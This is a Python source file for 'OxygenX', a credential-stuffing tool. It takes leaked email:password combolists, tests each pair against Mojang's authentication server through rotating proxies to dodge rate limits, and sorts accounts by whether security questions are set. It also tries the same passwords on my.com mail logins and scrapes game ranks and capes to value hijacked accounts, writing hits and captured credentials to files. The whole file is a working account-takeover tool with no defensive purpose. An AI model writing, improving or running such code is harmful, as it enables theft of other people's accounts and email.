from ctypes import windll
from multiprocessing.dummy import Pool as ThreadPool
from os import mkdir, path, system
from queue import Queue
from random import choice
from re import compile
from threading import Thread
from time import sleep, strftime

from colorama import init, Fore
from requests import get, post
from yaml import full_load

init()
while True:
    try:
        config = full_load(open('config.yml', 'r', errors='ignore'))
        break
    except FileNotFoundError:
        print(f'{Fore.LIGHTCYAN_EX}Config File not found, making file and loading default values...\n')
        open('config.yml', 'w').write('''checker:
  # Amount of checks for a account many times to check a account.
  # Needs to be 1 or higher
  retries: 2

  # Higher for better accuracy but slower (counted in milliseconds)
  timeout: 15000

  # Threads for account checking
  threads: 100

  # Check hits if its a mail access
  mail_access: true
  
  # Save ranked accounts in secured.txt or unsecured.txt
  save_rankedtypes: true
  
  # Save bad accounts, good for checking paid alts (will use more cpu and take longer)
  save_bad: false

  # User should keep this false
  debugging: false

  capes:
    # Check capes
    liquidbounce: true
    optifine: true
    labymod:  true
    # Minecon/Mojang cape
    minecon:  true

  rank:
    mineplex: true
    hypixel:  true
    hivemc: true

  level:
    # Check Levels
    hypixel: true
    mineplex: true
    # Minimum high level accounts
    hypixel_level: 25
    mineplex_level: 25

  proxy:
    # If proxies should be used, Will be proxyless if set to false (Use VPN if set to false or you will be ip banned)
    proxy: true
    # Proxy types: https | socks4 | socks5
    proxy_type: 'https'
    # Proxy file name
    proxy_file: 'proxies.txt'
''')
        sleep(3)
        system('cls')
    except Exception as eef:
        print(f'{Fore.LIGHTRED_EX}Error with {eef}')
        sleep(5)
        exit()


class Counter:
    nfa = 0
    sfa = 0
    unfa = 0
    demo = 0
    hits = 0
    bad = 0
    optifine = 0
    mojang = 0
    labymod = 0
    liquidbounce = 0
    special_name = 0
    hivemcrank = 0
    mineplexrank = 0
    mineplexhl = 0
    hypixelrank = 0
    hypixelhl = 0
    hivelevel = 0
    emailaccess = 0


class Main:
    def __init__(self):
        windll.kernel32.SetConsoleTitleW('OxygenX-0.2 | by ShadowOxygen')
        self.printing = Queue()
        self.caputer = Queue()
        self.hits = Queue()
        self.bad = Queue()
        self.towrite = Queue()
        self.accounts = []
        self.maheaders = {'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0', 'Pragma': 'no-cache'}
        self.hyr = compile(r'\n<span class=\"rank-badge rank-badge-.*\">(.*)</span>')
        self.hyl = compile(r"Player's Network Level\".*>(.*)<")
        self.rankhv = compile(r'class=\"rank.*\">(.*)<')
        self.levelmp = compile(r'>Level (.*)</b>')
        self.rankmp = compile(r'Rank\(\'(.*)\'\)')
        self.threads = Checker.threads
        self.retries = Checker.retries
        self.mpl = Checker.Level.mineplex
        self.mpr = Checker.Rank.mineplex_rank
        self.mpminl = Checker.Level.mineplex_level
        self.hivemcrank = Checker.Rank.hivemc_rank
        self.hypl = Checker.Level.hypixel
        self.hypr = Checker.Rank.hypixel_rank
        self.hypminl = Checker.Level.hypixel_level
        self.savebad = Checker.save_bad
        self.minecon = Checker.Cape.minecon
        self.optifinecape = Checker.Cape.optifine
        self.liquidcape = Checker.Cape.liquidbounce
        self.labymodcape = Checker.Cape.labymod
        self.debug = Checker.debug
        if self.retries == 0:
            self.retries = 1
        if self.threads == 0:
            self.threads = 1
        self.proxylist = Checker.Proxy.proxylist
        self.proxy_type = Checker.Proxy.type
        self.stop = True
        self.t = '''________                                     ____  ___
\_____  \ ___  ______.__. ____   ____   ____ \   \/  /
 /   |   \\\  \/  <   |  |/ ___\_/ __ \ /    \ \     /
/    |    \>    < \___  / /_/  >  ___/|   |  \/     \\
\_______  /__/\_ \/ ____\___  / \___  >___|  /___/\  \\
        \/      \/\/   /_____/      \/     \/      \_/
\n'''
        print(Fore.LIGHTCYAN_EX + self.t)
        try:
            self.proxys = open(self.proxylist, 'r', encoding='u8', errors='ignore').read().split()
        except FileNotFoundError:
            print(f'{Fore.LIGHTRED_EX}{self.proxylist} not found, Please make sure {self.proxylist} is in folder')
            input('Please close program and put proxy file name in config.yml')
            exit()
        while True:
            file = input("Please Enter Combolist Name (Please include extension name, Example: combolist.txt): ")
            try:
                self.combolist = open(file, 'r', encoding='u8', errors='ignore').read().split('\n')
                break
            except FileNotFoundError:
                print(f'\n{Fore.LIGHTRED_EX}File not found, please try again.{Fore.LIGHTCYAN_EX}\n')
                continue
        print('Starting OxygenX...')
        self.dictorary = open('dictionary.txt', 'a+').read()
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.folder = f'results/{unix}'
        if not path.exists('results'):
            mkdir('results')
        if not path.exists(self.folder):
            mkdir(self.folder)
        for x in self.combolist:
            self.accounts.append(x)
        t1 = Thread(target=self.prints)
        t1.daemon = True
        t1.start()
        Thread(target=self.writecap).start()
        Thread(target=self.writing).start()
        Thread(target=self.save_hits).start()
        t2 = Thread(target=self.tite)
        t2.daemon = True
        if self.savebad:
            Thread(target=self.save_bad).start()
        pool = ThreadPool(Checker.threads)
        system('cls')
        t2.start()
        print(Fore.LIGHTCYAN_EX + self.t + Fore.WHITE)
        pool.map(self.prep, self.accounts)
        pool.close()
        pool.join()
        while True:
            if self.printing.qsize() == 0 and self.towrite.qsize() == 0 and self.caputer.qsize() == 0 and self.bad.qsize() == 0 and self.hits.qsize() == 0:
                sleep(4)
                print(f'{Fore.LIGHTGREEN_EX}\n\nResults: \n'
                      f'Hits: {Counter.hits}\n'
                      f'Bad: {Counter.bad}\n'
                      f'Demo: {Counter.demo}\n'
                      f'Secured: {Counter.nfa}\n'
                      f'Unsecured: {Counter.sfa}\n'
                      f'Email Access: {Counter.emailaccess}\n'
                      f'Unmigrated: {Counter.unfa}\n'
                      f'Mojang/Minecon cape: {Counter.mojang}\n'
                      f'Optifine cape: {Counter.optifine}\n'
                      f'Labymod cape: {Counter.labymod}\n'
                      f'LiquidBounce cape: {Counter.liquidbounce}\n'
                      f'Hypixel Ranked accounts: {Counter.hypixelrank}\n'
                      f'Mineplex Ranked accounts: {Counter.mineplexrank}\n'
                      f'HiveMC Ranked accounts: {Counter.hivemcrank}\n'
                      f'Hypixel {self.hypminl}+ accounts: {Counter.hypixelhl}\n'
                      f'Mineplex {self.mpminl}+ accounts: {Counter.mineplexhl}\n'
                      f'{Fore.LIGHTMAGENTA_EX}\nFinished\n{Fore.LIGHTRED_EX}')
                if (Counter.hits + Counter.demo) == 0:
                    print(f'Your combo list is bad... ;-;')
                print(f'[Exit] Close the program to exit...{Fore.WHITE}')
                break

    def prep(self, line):
        try:
            email, password = line.split(':', 1)
            check_counter = 0
            answer = {'errorMessage': 'Invalid credentials'}
            while True:
                if check_counter != self.retries:
                    answer = self.checkmc(email, password)
                    if str(answer).__contains__('Invalid credentials'):
                        check_counter += 1
                    elif str(answer).__contains__('Request blocked.') or str(answer).__contains__(
                            "'Client sent too many requests too fast.'"):
                        sleep(0.1)
                    else:
                        break
                else:
                    break
            if str(answer).__contains__("errorMessage"):
                Counter.bad += 1
                if self.savebad:
                    self.bad.put(line)
            elif str(answer).__contains__("'availableProfiles': []}"):
                self.printing.put(Fore.LIGHTYELLOW_EX + f'[Demo] {line}' + Fore.WHITE)
                Counter.demo += 1
                self.towrite.put([line, 'Demo'])
            else:
                uuid = answer['availableProfiles'][0]["id"]
                username = answer['availableProfiles'][0]['name']
                self.hits.put(line)
                token = answer['accessToken']
                dosfa = True
                sfa = False
                saveranked = True
                securec = 'False'
                data = '======================================\n' \
                    f'{line}\n' \
                    f'Username: {username}\n' \
                    f'Email: {email}\n' \
                    f'Password: {password}'

                if str(answer).__contains__("'legacy': True"):
                    Counter.unfa += 1
                    self.printing.put(Fore.LIGHTMAGENTA_EX + f'[Unmigrated] {line}' + Fore.WHITE)
                    self.towrite.put([line, 'Unmigrated'])
                    data += '\nUnmigrated: True'
                    dosfa = False

                if dosfa:
                    securec = self.securedcheck(token=token)
                if securec == '[]':
                    Counter.sfa += 1
                    self.printing.put(
                        Fore.LIGHTGREEN_EX + f'[{Fore.LIGHTCYAN_EX + "Unsecured" + Fore.LIGHTGREEN_EX}] {line} User: {username}' + Fore.WHITE)
                    sfa = True
                    data += '\nUnsecured: True'
                elif securec == 'False':
                    pass
                else:
                    Counter.nfa += 1
                    self.printing.put(Fore.LIGHTGREEN_EX + f'[Secured] {line} User: {username}' + Fore.WHITE)
                Counter.hits += 1
                if self.name(username):
                    Counter.special_name += 1
                    self.towrite.put([f'{line} | Username: {username}', 'SpecialName'])
                    data += '\nSpecialName: True'

                if self.hypr or self.hypl:
                    hp = self.hypixel(uuid)
                    if self.hypr:
                        if hp[0] != 'False':
                            if not Checker.save_rankedtypes:
                                saveranked = False
                            Counter.hypixelrank += 1
                            self.towrite.put([f'{line} | Rank: {hp[0]}', 'HypixelRanked'])
                            data += f'\nHypixelRank: {hp[0]}'
                    if self.hypl:
                        if int(hp[1]) != 0:
                            data += f'\nHypixelLevel: {str(hp[1])}'
                            if int(hp[1]) >= self.hypminl:
                                Counter.hypixelhl += 1
                                self.towrite.put([f'{line} | Level: {str(hp[1])}', 'HypixelHighLevel'])

                if self.mpl or self.mpr:
                    mp = self.mineplex(username)
                    if self.mpr:
                        if mp[0] != 'False':
                            if not Checker.save_rankedtypes:
                                saveranked = False
                            Counter.mineplexrank += 1
                            self.towrite.put([f'{line} | Rank: {mp[0]}', 'MineplexRanked'])
                            data += f'\nMineplexRank: {mp[0]}'
                        if self.mpl:
                            if int(mp[1]) != 0:
                                data += f'\nMineplexLevel: {str(mp[1])}'
                                if int(mp[1]) >= self.mpminl:
                                    Counter.mineplexhl += 1
                                    self.towrite.put([f'{line} | Level: {str(mp[1])}', 'MineplexHighLevel'])

                if self.hivemcrank:
                    hivemc_rank = self.hivemc(uuid)
                    if hivemc_rank is not False:
                        if not Checker.save_rankedtypes:
                            saveranked = False
                        self.towrite.put([f'{line} | Rank: {str(hivemc_rank)}', 'HiveRanked'])
                        Counter.hivemcrank += 1
                        data += f'\nHiveRank: {str(hivemc_rank)}'
                if self.minecon:
                    if self.mojang(uuid):
                        Counter.mojang += 1
                        self.towrite.put([f'{line} | Username: {username}', 'MineconCape'])
                        data += '\nMojangCape: True'
                if self.optifinecape:
                    if self.optifine(username):
                        Counter.optifine += 1
                        self.towrite.put([f'{line} | Username: {username}', 'OptifineCape'])
                        data += '\nOptifineCape: True'
                if self.labymodcape:
                    if self.labymod(uuid):
                        Counter.labymod += 1
                        self.towrite.put([f'{line} | Username: {username}', 'LabymodCape'])
                        data += '\nLabymodCape: True'
                if self.liquidcape:
                    if self.liquidbounce(uuid):
                        Counter.liquidbounce += 1
                        self.towrite.put([f'{line} | Username: {username}', 'LiquidBounceCape'])
                        data += '\nLiquidBounceCape: True'
                if Checker.emailaccess and sfa:
                    if self.mailaccess(email, password):
                        Counter.emailaccess += 1
                        self.towrite.put([line, 'EmailAccess'])
                        data += '\nEmail Access: True'
                if saveranked:
                    if sfa:
                        self.towrite.put([line, 'Unsecured'])
                    else:
                        self.towrite.put([line, 'Secured'])

                self.caputer.put(data)
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}[Error] {line} \nError: {e}{Fore.WHITE}')
            if self.savebad:
                self.bad.put(line)
            Counter.bad += 1

    def checkmc(self, user, passw):
        try:
            headerz = {"Content-Type": "application/json"}
            payload = ({
                'agent': {
                    'name': 'Minecraft',
                    'version': 1
                },
                'username': user,
                'password': passw,
                'requestUser': 'true'
            })
            if not Checker.Proxy.proxy:
                answer = post('https://authserver.mojang.com/authenticate', json=payload,
                              headers=headerz, timeout=Checker.timeout / 1000).json()
            else:
                while True:
                    try:
                        answer = post('https://authserver.mojang.com/authenticate', proxies=self.proxies(),
                                      json=payload,
                                      headers=headerz, timeout=Checker.timeout / 1000).json()
                        break
                    except:
                        continue
            answered = answer
        except Exception as e:
            if self.debug:
                self.printing.put(f'CheckMC: \n{e}')
            answered = 'errorMessage'
        return answered

    def securedcheck(self, token):
        try:
            while True:
                hds = {"Authorization": f"Bearer {token}"}
                try:
                    lol = get('https://api.mojang.com/user/security/challenges',
                              headers=hds, proxies=self.proxies(), timeout=8).text
                    break
                except:
                    continue
            answer = lol
        except Exception as e:
            if self.debug:
                self.printing.put(f'Error SFA: \n{e}')
            answer = 'NFAAAA'
        return answer

    def tite(self):
        while self.stop:
            windll.kernel32.SetConsoleTitleW(
                "OxygenX | "
                f"Hits: {str(Counter.hits)}"
                f" | Bad: {str(Counter.bad)}"
                f' | Secured: {str(Counter.nfa)}'
                f' | Unsecured: {str(Counter.sfa)}'
                f' | Demo: {str(Counter.demo)}'
                f' | Mail Access: {str(Counter.emailaccess)}'
                f' | Unmigrated: {str(Counter.unfa)}'
                f" | Left: {str(len(self.combolist) - (Counter.hits + Counter.bad + Counter.demo))}")
            sleep(0.01)

    def prints(self):
        while self.stop:
            while self.printing.qsize() != 0:
                print(self.printing.get())
                sleep(0.01)

    def proxies(self):
        proxy = choice(self.proxys)
        proxy_form = {}
        if proxy.count(':') == 3:
            spl = proxy.split(':')
            proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
        else:
            proxy = proxy
        if self.proxy_type == 'http' or self.proxy_type == 'https':
            proxy_form = {
                'http': f"http://{proxy}",
                'https': f"https://{proxy}"
            }
        elif self.proxy_type == 'socks5' or self.proxy_type == 'socks4':
            proxy_form = {
                'http': f"{self.proxy_type}://{proxy}",
                'https': f"{self.proxy_type}://{proxy}"
            }
        return proxy_form

    def writecap(self):
        while self.stop:
            while self.caputer.qsize() != 0:
                open(f'{self.folder}/CapturedData.txt', 'a', encoding='u8').write(f'{self.caputer.get()}\n')

    def writing(self):
        while True:
            while self.towrite.qsize() != 0:
                z = self.towrite.get()
                open(f'{self.folder}/{z[1]}.txt', 'a', encoding='u8').write(f'{z[0]}\n')

    def save_bad(self):
        while True:
            while self.bad.qsize() != 0:
                with open(f'{self.folder}/Bad.txt', 'a', encoding='u8') as bad:
                    bad.write(f'{self.bad.get()}\n')

    def save_hits(self):
        while True:
            while self.hits.qsize() != 0:
                with open(f'{self.folder}/Hits.txt', 'a', encoding='u8') as bad:
                    bad.write(f'{self.hits.get()}\n')

    def optifine(self, username):
        try:
            optifine = get(f'http://107.182.233.85/capes/{username}.png', timeout=6).text
            if not str(optifine).__contains__('Not found'):
                return True
            else:
                return False
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error Optifine:\n{e}{Fore.WHITE}')
            return False

    def name(self, name):
        if len(name) <= 3 or name in self.dictorary:
            return True
        else:
            return False

    def mojang(self, uuid):
        try:
            mine = get(f'https://api.ashcon.app/mojang/v2/user/{uuid}', timeout=6).text
            if mine.__contains__('"cape"'):
                return True
            else:
                return False
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error MojangCape:\n{e}{Fore.WHITE}')
            return False

    def labymod(self, uuid):
        try:
            uuid_with_dashes = uuid[:8] + '-' + uuid[8:12] + '-' + uuid[12:16] + '-' + uuid[16:20] + '-' + uuid[20:]
            laby = get(f'http://capes.labymod.net/capes/{uuid_with_dashes}', timeout=6).text
            if not str(laby).__contains__('Not Found'):
                return True
            else:
                return False
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error Labymod:\n{e}{Fore.WHITE}')
            return False

    def liquidbounce(self, uuid):
        try:
            lbc = get(
                f'https://raw.githubusercontent.com/CCBlueX/FileCloud/master/LiquidBounce/cape/service.json',
                timeout=6).text
            if lbc.__contains__(uuid):
                return True
            else:
                return False
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error LiquidBounce:\n{e}{Fore.WHITE}')
            return False

    def hivemc(self, uuid):
        try:
            response = get(f'https://www.hivemc.com/player/{uuid}', timeout=6).text
            match = self.rankhv.search(response).group(1)
            if match == 'Regular':
                return False
            else:
                return match
        except AttributeError:
            return False
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error HiveMC:\n{e}{Fore.WHITE}')
            return False

    def mineplex(self, username):
        both = ['False', '0']
        try:
            response = str(get(f'https://www.mineplex.com/players/{username}', timeout=8).text)
            if response.__contains__('That player cannot be found.'):
                both[1] = 0
                both[0] = 'False'
            else:
                both[1] = self.levelmp.search(response).group(1)
                both[0] = self.rankmp.search(response).group(1)
                if both[0].lower() == 'player':
                    both[0] = 'False'
            return both
        except Exception as e:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error Mineplex:\n{e}{Fore.WHITE}')
            return both

    def hypixel(self, uuid):
        both = ['False', '0']
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'}
        try:
            response = get(f'https://hypixel.net/player/{uuid}', headers=headers, timeout=8).text
            if response.__contains__("Player's Network Level"):
                both[1] = self.hyl.search(response).group(1)
                if '\n<span class="rank-badge' in response:
                    both[0] = self.hyr.search(response).group(1)
            return both
        except Exception as ed:
            if self.debug:
                self.printing.put(f'{Fore.LIGHTRED_EX}Error Hypixel:\n{ed}{Fore.WHITE}')
            return both

    def mailaccess(self, email, password):
        test = get(
            f'https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOSÂ¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={email}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password={password}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&',
            headers=self.maheaders).text
        if 'Ok=1' in test:
            return True
        else:
            return False


class Checker:
    retries = int(config['checker']['retries'])
    timeout = int(config['checker']['timeout'])
    threads = int(config['checker']['threads'])
    emailaccess = bool(config['checker']['mail_access'])
    save_rankedtypes = bool(config['checker']['save_rankedtypes'])
    save_bad = bool(config['checker']['save_bad'])
    debug = bool(config['checker']['debugging'])

    class Cape:
        liquidbounce = bool(config['checker']['capes']['liquidbounce'])
        optifine = bool(config['checker']['capes']['optifine'])
        labymod = bool(config['checker']['capes']['labymod'])
        minecon = bool(config['checker']['capes']['minecon'])

    class Rank:
        mineplex_rank = bool(config['checker']['rank']['mineplex'])
        hypixel_rank = bool(config['checker']['rank']['hypixel'])
        hivemc_rank = bool(config['checker']['rank']['hivemc'])

    class Level:
        hypixel = bool(config['checker']['level']['hypixel'])
        mineplex = bool(config['checker']['level']['mineplex'])
        hypixel_level = int(config['checker']['level']['hypixel_level'])
        mineplex_level = int(config['checker']['level']['mineplex_level'])

    class Proxy:
        proxy = bool(config['checker']['proxy']['proxy'])
        proxylist = str(config['checker']['proxy']['proxy_file'])
        type = str(config['checker']['proxy']['proxy_type'])


if __name__ == '__main__':
    Main()
